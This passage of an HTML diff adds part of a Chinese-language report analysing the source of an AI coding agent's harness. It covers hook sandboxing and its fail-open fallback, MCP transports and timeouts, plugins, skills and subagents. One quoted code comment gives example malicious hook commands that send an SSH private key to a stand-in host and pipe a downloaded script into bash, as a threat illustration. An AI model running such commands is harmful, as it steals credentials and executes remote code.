+  <article class="finding" id="claude-code-sandbox-002" data-search="hook 只做网络沙箱，包装失败时会继续无沙箱执行 shell hook 在 sandbox 开启时配置 deny-all outbound，但给予全文件系统写权限；wrap 失败会记录 warning 并运行原命令。bash 的 excludedcommands 也被源码明确标注为便利功能而非安全边界。 hook 能被断网，但仍可改本机文件；连断网罩都戴不上时，为兼容旧行为会直接执行。 permissions-sandbox">
+    <header class="finding-head">
+      <div class="finding-no">15</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>风险</span><span>claude-code-sandbox-002</span></div>
+        <h3>hook 只做网络沙箱，包装失败时会继续无沙箱执行</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>shell hook 在 sandbox 开启时配置 deny-all outbound，但给予全文件系统写权限；wrap 失败会记录 warning 并运行原命令。Bash 的 excludedCommands 也被源码明确标注为便利功能而非安全边界。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>hook 能被断网，但仍可改本机文件；连断网罩都戴不上时，为兼容旧行为会直接执行。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>企业场景应把 hook fail-open 改为策略可控的 fail-closed，并把项目 hook 来源信任与动作权限分开。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 证据</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/utils/hooks.ts · L1041–L1088</div>
+        <pre><code> 1041    // SECURITY: Apply network-only sandbox to hook commands when sandboxing is enabled.
+ 1042    // Hooks execute arbitrary shell commands from settings.json without going
+ 1043    // through the Bash tool&#39;s permission prompt. Unlike the full Bash sandbox,
+ 1044    // hooks only get network restrictions (not filesystem restrictions) because:
+ 1045    //   - Legitimate hooks (formatters, linters, type checkers) need full
+ 1046    //     filesystem access to read/write project files
+ 1047    //   - The core threat from malicious hooks is data exfiltration (e.g.
+ 1048    //     `curl http://evil.com?key=$(cat ~/.ssh/id_rsa)`) and payload download
+ 1049    //     (e.g. `wget http://evil.com/malware.sh | bash`)
+ 1050    //   - Hooks that genuinely need network (notifications) should use the
+ 1051    //     `http` hook type, which is not affected by this sandbox
+ 1052    let sandboxedCommand = finalCommand
+ 1053    if (!isPowerShell &amp;&amp; SandboxManager.isSandboxingEnabled()) {
+ 1054      try {
+ 1055        sandboxedCommand = await SandboxManager.wrapWithSandbox(
+ 1056          finalCommand,
+ 1057          undefined, // use default shell
+ 1058          {
+ 1059            // Network: deny all outbound by default. Hooks that need network
+ 1060            // should use the `http` hook type instead of shell commands.
+ 1061            network: {
+ 1062              allowedDomains: [],
+ 1063              deniedDomains: [],
+ 1064            },
+      … 14 lines omitted; exact range 1041–1088 …
+ 1079        )
+ 1080      } catch (sandboxError) {
+ 1081        // If sandbox wrapping fails, log and continue without sandbox.
+ 1082        // This preserves backwards compatibility — hooks that ran before
+ 1083        // sandbox support was added will still work.
+ 1084        logForDebugging(
+ 1085          `Failed to sandbox hook command, running unsandboxed: ${errorMessage(sandboxError)}`,
+ 1086          { level: &#39;warn&#39; },
+ 1087        )
+ 1088      }</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">证据</span>
+      <code>src/utils/hooks.ts:1041–1088</code>
+      <span>hook network-only sandbox 与失败后无沙箱执行。</span>
+    </li>
+    <li>
+      <span class="role">证据</span>
+      <code>packages/builtin-tools/src/tools/BashTool/shouldUseSandbox.ts:18–20</code>
+      <span>excludedCommands 不是安全边界。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/BashTool/shouldUseSandbox.ts:130–152</code>
+      <span>显式 disable/excluded command 绕开 sandbox。</span>
+    </li></ul>
+    </details>
+  </article>
+    </section>
+    <section class="chapter evidence-chapter" id="dim-7">
+      <div class="chapter-rule"><span>07</span></div>
+      <div class="chapter-kicker">DIMENSION · MCP-CONNECTORS</div>
+      <h2>MCP 与连接器</h2>
+      <p class="chapter-deck">本章共 2 个可定位结论；结论按“实现事实 → 白话解释 → 工程影响 → 源码摘录”展开。</p>
+      
+  <article class="finding" id="claude-code-mcp-001" data-search="mcp 是完整连接层：stdio、sse、streamable http、websocket 和 claude.ai proxy client 根据 server type 构造不同 transport，支持 oauth/static/session ingress header、代理、ide 通道和进程内 server；连接有超时，断线会清连接及工具/资源缓存以便重连。 它不是只会启动本地 mcp 子进程，也能连长连接、http、websocket 和平台代理；线断了会丢掉旧工具清单重新握手。 mcp-connectors">
+    <header class="finding-head">
+      <div class="finding-no">16</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-mcp-001</span></div>
+        <h3>MCP 是完整连接层：stdio、SSE、Streamable HTTP、WebSocket 和 claude.ai proxy</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>client 根据 server type 构造不同 transport，支持 OAuth/static/session ingress header、代理、IDE 通道和进程内 server；连接有超时，断线会清连接及工具/资源缓存以便重连。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>它不是只会启动本地 MCP 子进程，也能连长连接、HTTP、WebSocket 和平台代理；线断了会丢掉旧工具清单重新握手。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>连接器成熟度高，但 transport 分支很多，安全策略和生命周期测试成本显著。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/services/mcp/client.ts · L596–L678</div>
+        <pre><code>  596  export const connectToServer = memoize(
+  597    async (
+  598      name: string,
+  599      serverRef: ScopedMcpServerConfig,
+  600      serverStats?: {
+  601        totalServers: number
+  602        stdioCount: number
+  603        sseCount: number
+  604        httpCount: number
+  605        sseIdeCount: number
+  606        wsIdeCount: number
+  607      },
+  608    ): Promise&lt;MCPServerConnection&gt; =&gt; {
+  609      const connectStartTime = Date.now()
+  610      let inProcessServer:
+  611        | { connect(t: Transport): Promise&lt;void&gt;; close(): Promise&lt;void&gt; }
+  612        | undefined
+  613      try {
+  614        let transport
+  615  
+  616        // If we have the session ingress JWT, we will connect via the session ingress rather than
+  617        // to remote MCP&#39;s directly.
+  618        const sessionIngressToken = getSessionIngressAuthToken()
+  619  
+      … 49 lines omitted; exact range 596–678 …
+  669                },
+  670              })
+  671            },
+  672          }
+  673  
+  674          transport = new SSEClientTransport(
+  675            new URL(serverRef.url),
+  676            transportOptions,
+  677          )
+  678          logMCPDebug(name, `SSE transport initialized, awaiting connection`)</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/mcp/client.ts:596–678</code>
+      <span>SSE transport 与 OAuth/header。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/mcp/client.ts:709–905</code>
+      <span>WebSocket、HTTP 和 claude.ai proxy。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/mcp/client.ts:1030–1110</code>
+      <span>连接超时和错误分类。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-mcp-002" data-search="mcp 具备描述限长、请求超时与企业 allow/deny 管理 工具描述和 server instructions 有长度上限；普通 post 请求 60 秒超时，但工具调用默认约 27.8 小时且可由环境变量覆盖；配置层合并 plugin/connectors，并应用企业 allowlist/denylist。 连接握手不会无限等，过长的工具说明不会把上下文吃光；但真正工具执行默认几乎不设上限，长任务友好、失控任务风险也更大。 mcp-connectors">
+    <header class="finding-head">
+      <div class="finding-no">17</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-mcp-002</span></div>
+        <h3>MCP 具备描述限长、请求超时与企业 allow/deny 管理</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>工具描述和 server instructions 有长度上限；普通 POST 请求 60 秒超时，但工具调用默认约 27.8 小时且可由环境变量覆盖；配置层合并 plugin/connectors，并应用企业 allowlist/denylist。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>连接握手不会无限等，过长的工具说明不会把上下文吃光；但真正工具执行默认几乎不设上限，长任务友好、失控任务风险也更大。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>自研 Harness 应把 connect/request/tool 三类 timeout 分开，并给 MCP 执行建立组织级上限与取消链。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 配置</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/services/mcp/client.ts · L210–L229</div>
+        <pre><code>  210   * Default timeout for MCP tool calls (effectively infinite - ~27.8 hours).
+  211   */
+  212  const DEFAULT_MCP_TOOL_TIMEOUT_MS = 100_000_000
+  213  
+  214  /**
+  215   * Cap on MCP tool descriptions and server instructions sent to the model.
+  216   * OpenAPI-generated MCP servers have been observed dumping 15-60KB of endpoint
+  217   * docs into tool.description; this caps the p95 tail without losing the intent.
+  218   */
+  219  const MAX_MCP_DESCRIPTION_LENGTH = PKG_MAX_MCP_DESCRIPTION_LENGTH
+  220  
+  221  /**
+  222   * Gets the timeout for MCP tool calls in milliseconds.
+  223   * Uses MCP_TOOL_TIMEOUT environment variable if set, otherwise defaults to ~27.8 hours.
+  224   */
+  225  function getMcpToolTimeoutMs(): number {
+  226    return (
+  227      parseInt(process.env.MCP_TOOL_TIMEOUT || &#39;&#39;, 10) ||
+  228      DEFAULT_MCP_TOOL_TIMEOUT_MS
+  229    )</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 4 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">配置</span>
+      <code>src/services/mcp/client.ts:210–229</code>
+      <span>工具调用 timeout 与描述限长。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/mcp/client.ts:462–530</code>
+      <span>HTTP 请求独立 timeout。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/services/mcp/config.ts:214–309</code>
+      <span>plugin/connectors 去重与手工配置优先。</span>
+    </li>
+    <li>
+      <span class="role">证据</span>
+      <code>src/services/mcp/config.ts:336–430</code>
+      <span>企业 allowlist/denylist 来源与匹配。</span>
+    </li></ul>
+    </details>
+  </article>
+    </section>
+    <section class="chapter evidence-chapter" id="dim-8">
+      <div class="chapter-rule"><span>08</span></div>
+      <div class="chapter-kicker">DIMENSION · INSTRUCTIONS-SKILLS-PLUGINS</div>
+      <h2>指令、Skills 与插件</h2>
+      <p class="chapter-deck">本章共 3 个可定位结论；结论按“实现事实 → 白话解释 → 工程影响 → 源码摘录”展开。</p>
+      
+  <article class="finding" id="claude-code-instructions-001" data-search="项目指令与环境快照分层注入，并在会话内缓存 getusercontext 从层级 memory files 组装 claude.md，可通过 bare/环境变量禁用；getsystemcontext 并行采集 git branch/status/log/user 并截断状态，二者 memoize 为会话上下文。 一份是团队写给 agent 的长期说明书，另一份是开工那一刻的工地快照；后者明确不会自动更新。 instructions-skills-plugins">
+    <header class="finding-head">
+      <div class="finding-no">18</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-instructions-001</span></div>
+        <h3>项目指令与环境快照分层注入，并在会话内缓存</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>getUserContext 从层级 memory files 组装 CLAUDE.md，可通过 bare/环境变量禁用；getSystemContext 并行采集 git branch/status/log/user 并截断状态，二者 memoize 为会话上下文。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>一份是团队写给 Agent 的长期说明书，另一份是开工那一刻的工地快照；后者明确不会自动更新。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>prompt cache 稳定，但会话中的 git status 会变旧，模型需要在关键操作前主动重新查询。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/context.ts · L36–L111</div>
+        <pre><code>   36  export const getGitStatus = memoize(async (): Promise&lt;string | null&gt; =&gt; {
+   37    if (process.env.NODE_ENV === &#39;test&#39;) {
+   38      // Avoid cycles in tests
+   39      return null
+   40    }
+   41  
+   42    const startTime = Date.now()
+   43    logForDiagnosticsNoPII(&#39;info&#39;, &#39;git_status_started&#39;)
+   44  
+   45    const isGitStart = Date.now()
+   46    const isGit = await getIsGit()
+   47    logForDiagnosticsNoPII(&#39;info&#39;, &#39;git_is_git_check_completed&#39;, {
+   48      duration_ms: Date.now() - isGitStart,
+   49      is_git: isGit,
+   50    })
+   51  
+   52    if (!isGit) {
+   53      logForDiagnosticsNoPII(&#39;info&#39;, &#39;git_status_skipped_not_git&#39;, {
+   54        duration_ms: Date.now() - startTime,
+   55      })
+   56      return null
+   57    }
+   58  
+   59    try {
+      … 42 lines omitted; exact range 36–111 …
+  102        `Recent commits:\n${log}`,
+  103      ].join(&#39;\n\n&#39;)
+  104    } catch (error) {
+  105      logForDiagnosticsNoPII(&#39;error&#39;, &#39;git_status_failed&#39;, {
+  106        duration_ms: Date.now() - startTime,
+  107      })
+  108      logError(error)
+  109      return null
+  110    }
+  111  })</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/context.ts:36–111</code>
+      <span>git 快照、并行采集和截断。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/context.ts:113–150</code>
+      <span>system context memoize。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/context.ts:152–188</code>
+      <span>CLAUDE.md discovery、禁用门和 user context。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-plugin-001" data-search="插件是复合扩展包，不只是 prompt 文件 plugin loader 支持 marketplace/git/npm 缓存、manifest schema 和路径 containment，并从 commands、agents、skills、output styles、hooks 等目录装载组件；缺 manifest 时还能创建最小 manifest。 一个插件能同时带命令、技能、子 agent 和钩子，接近应用包而不是单张提示词。 instructions-skills-plugins">
+    <header class="finding-head">
+      <div class="finding-no">19</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-plugin-001</span></div>
+        <h3>插件是复合扩展包，不只是 prompt 文件</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>plugin loader 支持 marketplace/git/npm 缓存、manifest schema 和路径 containment，并从 commands、agents、skills、output styles、hooks 等目录装载组件；缺 manifest 时还能创建最小 manifest。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>一个插件能同时带命令、技能、子 Agent 和钩子，接近应用包而不是单张提示词。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>扩展能力强，也扩大供应链与任意代码执行面；必须把来源、版本、签名/审批和 hooks 权限纳入治理。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 证据</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/utils/plugins/pluginLoader.ts · L1–L29</div>
+        <pre><code>    1  /**
+    2   * Plugin Loader Module
+    3   *
+    4   * This module is responsible for discovering, loading, and validating Claude Code plugins
+    5   * from various sources including marketplaces and git repositories.
+    6   *
+    7   * NPM packages are also supported but must be referenced through marketplaces - the marketplace
+    8   * entry contains the NPM package information.
+    9   *
+   10   * Plugin Discovery Sources (in order of precedence):
+   11   * 1. Marketplace-based plugins (plugin@marketplace format in settings)
+   12   * 2. Session-only plugins (from --plugin-dir CLI flag or SDK plugins option)
+   13   *
+   14   * Plugin Directory Structure:
+   15   * ```
+   16   * my-plugin/
+   17   * ├── plugin.json          # Optional manifest with metadata
+   18   * ├── commands/            # Custom slash commands
+   19   * │   ├── build.md
+   20   * │   └── deploy.md
+   21   * ├── agents/              # Custom AI agents
+   22   * │   └── test-runner.md
+   23   * └── hooks/               # Hook configurations
+   24   *     └── hooks.json       # Hook definitions
+   25   * ```
+   26   *
+   27   * The loader handles:
+   28   * - Plugin manifest validation
+   29   * - Hooks configuration loading and variable resolution</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">证据</span>
+      <code>src/utils/plugins/pluginLoader.ts:1–29</code>
+      <span>插件来源、目录结构和 loader 职责。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/plugins/pluginLoader.ts:912–1092</code>
+      <span>缓存、manifest 校验与版本目录。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/utils/plugins/pluginLoader.ts:1314–1389</code>
+      <span>复合组件发现与 plugin object 构造。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-skill-001" data-search="skill 采用元数据先行、内容按需装载，并支持路径条件激活 skill loader 只用 name/description/whentouse 估算前置 token；完整内容在调用时读取，运行中还能扫描新目录，按 paths frontmatter 匹配触及文件后激活条件 skill。 模型先看技能目录卡片，真正要用时才翻整本手册；碰到特定文件类型还能自动把相关手册加入工具箱。 instructions-skills-plugins">
+    <header class="finding-head">
+      <div class="finding-no">20</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-skill-001</span></div>
+        <h3>Skill 采用元数据先行、内容按需装载，并支持路径条件激活</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>skill loader 只用 name/description/whenToUse 估算前置 token；完整内容在调用时读取，运行中还能扫描新目录，按 paths frontmatter 匹配触及文件后激活条件 skill。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>模型先看技能目录卡片，真正要用时才翻整本手册；碰到特定文件类型还能自动把相关手册加入工具箱。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>降低常驻 prompt 成本，但动态注册必须维持工具定义排序和缓存稳定。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">src/skills/loadSkillsDir.ts · L78–L108</div>
+        <pre><code>   78  export function getSkillsPath(
+   79    source: SettingSource | &#39;plugin&#39;,
+   80    dir: &#39;skills&#39; | &#39;commands&#39;,
+   81  ): string {
+   82    switch (source) {
+   83      case &#39;policySettings&#39;:
+   84        return join(getManagedFilePath(), &#39;.claude&#39;, dir)
+   85      case &#39;userSettings&#39;:
+   86        return join(getClaudeConfigHomeDir(), dir)
+   87      case &#39;projectSettings&#39;:
+   88        return `.claude/${dir}`
+   89      case &#39;plugin&#39;:
+   90        return &#39;plugin&#39;
+   91      default:
+   92        return &#39;&#39;
+   93    }
+   94  }
+   95  
+   96  /**
+   97   * Estimates token count for a skill based on frontmatter only
+   98   * (name, description, whenToUse) since full content is only loaded on invocation.
+   99   */
+  100  export function estimateSkillFrontmatterTokens(skill: Command): number {
+  101    const frontmatterText = [skill.name, skill.description, skill.whenToUse]
+  102      .filter(Boolean)
+  103      .join(&#39; &#39;)
+  104    return roughTokenCountEstimation(frontmatterText)
+  105  }
+  106  
+  107  /**
+  108   * Gets a unique identifier for a file by resolving symlinks to a canonical path.</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>src/skills/loadSkillsDir.ts:78–108</code>
+      <span>skill 路径和 frontmatter token 估算。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/skills/loadSkillsDir.ts:182–260</code>
+      <span>frontmatter 解析和延迟加载字段。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>src/skills/loadSkillsDir.ts:986–1054</code>
+      <span>按文件路径条件激活 skill。</span>
+    </li></ul>
+    </details>
+  </article>
+    </section>
+    <section class="chapter evidence-chapter" id="dim-9">
+      <div class="chapter-rule"><span>09</span></div>
+      <div class="chapter-kicker">DIMENSION · SUBAGENTS-COLLABORATION</div>
+      <h2>子 Agent 与协作</h2>
+      <p class="chapter-deck">本章共 3 个可定位结论；结论按“实现事实 → 白话解释 → 工程影响 → 源码摘录”展开。</p>
+      
+  <article class="finding" id="claude-code-agent-001" data-search="子 agent 是独立 query 运行时，可定制模型、工具、权限、mcp、hooks、skills、memory 和 isolation agent 定义 schema 包含 tools/disallowedtools、model/effort、permissionmode、mcpservers、hooks、maxturns、skills、memory、background、worktree isolation；runagent 为其构造独立系统提示、工具池、权限视图、mcp client 和 transcript。 它不是把任务文本塞给同一个聊天窗口，而是给工人发单独的工具箱、说明书、权限卡和工作日志。 subagents-collaboration">
+    <header class="finding-head">
+      <div class="finding-no">21</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-agent-001</span></div>
+        <h3>子 Agent 是独立 query 运行时，可定制模型、工具、权限、MCP、hooks、skills、memory 和 isolation</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>Agent 定义 schema 包含 tools/disallowedTools、model/effort、permissionMode、mcpServers、hooks、maxTurns、skills、memory、background、worktree isolation；runAgent 为其构造独立系统提示、工具池、权限视图、MCP client 和 transcript。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>它不是把任务文本塞给同一个聊天窗口，而是给工人发单独的工具箱、说明书、权限卡和工作日志。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>这是实质多 Agent Harness；复杂性主要在权限继承、资源清理、缓存和恢复，而非“能不能再调一次模型”。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 契约</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">packages/builtin-tools/src/tools/AgentTool/loadAgentsDir.ts · L58–L132</div>
+        <pre><code>   58  export type AgentMcpServerSpec =
+   59    | string // Reference to existing server by name (e.g., &quot;slack&quot;)
+   60    | { [name: string]: McpServerConfig } // Inline definition as { name: config }
+   61  
+   62  // Zod schema for agent MCP server specs
+   63  const AgentMcpServerSpecSchema = lazySchema(() =&gt;
+   64    z.union([
+   65      z.string(), // Reference by name
+   66      z.record(z.string(), McpServerConfigSchema()), // Inline as { name: config }
+   67    ]),
+   68  )
+   69  
+   70  // Zod schemas for JSON agent validation
+   71  // Note: HooksSchema is lazy so the circular chain AppState -&gt; loadAgentsDir -&gt; settings/types
+   72  // is broken at module load time
+   73  const AgentJsonSchema = lazySchema(() =&gt;
+   74    z.object({
+   75      description: z.string().min(1, &#39;Description cannot be empty&#39;),
+   76      tools: z.array(z.string()).optional(),
+   77      disallowedTools: z.array(z.string()).optional(),
+   78      prompt: z.string().min(1, &#39;Prompt cannot be empty&#39;),
+   79      model: z
+   80        .string()
+   81        .trim()
+      … 41 lines omitted; exact range 58–132 …
+  123    background?: boolean // Always run as background task when spawned
+  124    initialPrompt?: string // Prepended to the first user turn (slash commands work)
+  125    memory?: AgentMemoryScope // Persistent memory scope
+  126    isolation?: &#39;worktree&#39; | &#39;remote&#39; // Run in an isolated git worktree, or remotely in CCR (ant-only)
+  127    pendingSnapshotUpdate?: { snapshotTimestamp: string }
+  128    /** Omit CLAUDE.md hierarchy from the agent&#39;s userContext. Read-only agents
+  129     * (Explore, Plan) don&#39;t need commit/PR/lint guidelines — the main agent has
+  130     * full CLAUDE.md and interprets their output. Saves ~5-15 Gtok/week across
+  131     * 34M+ Explore spawns. Kill-switch: tengu_slim_subagent_claudemd. */
+  132    omitClaudeMd?: boolean</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 3 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">契约</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/loadAgentsDir.ts:58–132</code>
+      <span>Agent JSON/frontmatter 能力面。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/runAgent.ts:509–673</code>
+      <span>工具、系统 prompt、hooks、skills 与 MCP 装配。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/runAgent.ts:675–751</code>
+      <span>独立 context、sidechain 和 metadata。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-agent-002" data-search="同步、异步、fork 与 worktree 是四个可组合的协作语义 后台 agent 使用不链接父 esc 的 abortcontroller 并返回 async_launched；fork 可继承完整父消息、精确 system prompt 和工具定义以共享 prompt cache；worktree isolation 创建独立工作副本，无改动时清理、有改动时保留。 工人可以当场等结果，也能后台继续；可以只拿任务卡，也能复制父会话全部记忆；改代码时还能分配独立工位。 subagents-collaboration">
+    <header class="finding-head">
+      <div class="finding-no">22</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-agent-002</span></div>
+        <h3>同步、异步、fork 与 worktree 是四个可组合的协作语义</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
+        <div class="fact-block"><span class="mini-label">源码事实</span><p>后台 Agent 使用不链接父 ESC 的 AbortController 并返回 async_launched；fork 可继承完整父消息、精确 system prompt 和工具定义以共享 prompt cache；worktree isolation 创建独立工作副本，无改动时清理、有改动时保留。</p></div>
+        <div class="plain-block"><span class="mini-label">白话解释</span><p>工人可以当场等结果，也能后台继续；可以只拿任务卡，也能复制父会话全部记忆；改代码时还能分配独立工位。</p></div>
+        <div class="impact-block"><span class="mini-label">对自研 Harness 的含义</span><p>协作吞吐与上下文复用领先，但 worktree 只是文件工作区隔离，不等于进程/网络安全沙箱。</p></div>
+        
+      </div>
+      <div class="code-card">
+        <div class="code-head">
+          <span>关键源码 · 实现</span>
+          <button class="copy-code" type="button" aria-label="复制代码">复制</button>
+        </div>
+        <div class="code-path">packages/builtin-tools/src/tools/AgentTool/forkSubagent.ts · L18–L71</div>
+        <pre><code>   18  /**
+   19   * Fork subagent feature gate.
+   20   *
+   21   * When enabled:
+   22   * - `subagent_type` becomes optional on the Agent tool schema
+   23   * - Omitting `subagent_type` triggers an implicit fork: the child inherits
+   24   *   the parent&#39;s full conversation context and system prompt
+   25   * - All agent spawns run in the background (async) for a unified
+   26   *   `&lt;task-notification&gt;` interaction model
+   27   * - `/fork &lt;directive&gt;` slash command is available
+   28   *
+   29   * Mutually exclusive with coordinator mode — coordinator already owns the
+   30   * orchestration role and has its own delegation model.
+   31   */
+   32  export function isForkSubagentEnabled(): boolean {
+   33    if (feature(&#39;FORK_SUBAGENT&#39;)) {
+   34      if (isCoordinatorMode()) return false
+   35      if (getIsNonInteractiveSession()) return false
+   36      return true
+   37    }
+   38    return false
+   39  }
+   40  
+   41  /** Synthetic agent type name used for analytics when the fork path fires. */
+      … 20 lines omitted; exact range 18–71 …
+   62    whenToUse:
+   63      &#39;Implicit fork — inherits full conversation context. Not selectable via subagent_type; triggered by omitting subagent_type when the fork experiment is active.&#39;,
+   64    tools: [&#39;*&#39;],
+   65    maxTurns: 200,
+   66    model: &#39;inherit&#39;,
+   67    permissionMode: &#39;bubble&#39;,
+   68    source: &#39;built-in&#39;,
+   69    baseDir: &#39;built-in&#39;,
+   70    getSystemPrompt: () =&gt; &#39;&#39;,
+   71  } satisfies BuiltInAgentDefinition</code></pre>
+      </div>
+    </div>
+    <details class="evidence-list">
+      <summary>查看全部 4 处证据</summary>
+      <ul>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/forkSubagent.ts:18–71</code>
+      <span>fork gate、完整上下文和 bubble mode。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/forkSubagent.ts:95–175</code>
+      <span>cache-identical fork message 构造。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/AgentTool.tsx:696–827</code>
+      <span>async 判定、worktree 创建与清理。</span>
+    </li>
+    <li>
+      <span class="role">实现</span>
+      <code>packages/builtin-tools/src/tools/AgentTool/AgentTool.tsx:829–912</code>
+      <span>后台生命周期和独立取消。</span>
+    </li></ul>
+    </details>
+  </article>
+  <article class="finding" id="claude-code-agent-003" data-search="子 agent 有 sidechain 持久化、可恢复元数据和严格资源清理 runagent 将初始/新增消息写入独立 sidechain jsonl，并记录 agenttype、worktreepath、description；finally 结束 langfuse trace，关闭 agent mcp、hooks、缓存、文件状态、todo、shell/monitor tasks。 后台工人有自己的工作日志，重启后能知道它是谁、在哪个工位；收工时也会回收插座、进程和临时账本。 subagents-collaboration">
+    <header class="finding-head">
+      <div class="finding-no">23</div>
+      <div>
+        <div class="eyebrow"><span class="level">L1</span><span>事实</span><span>claude-code-agent-003</span></div>
+        <h3>子 Agent 有 sidechain 持久化、可恢复元数据和严格资源清理</h3>
+      </div>
+    </header>
+    <div class="finding-grid">
+      <div class="analysis-copy">
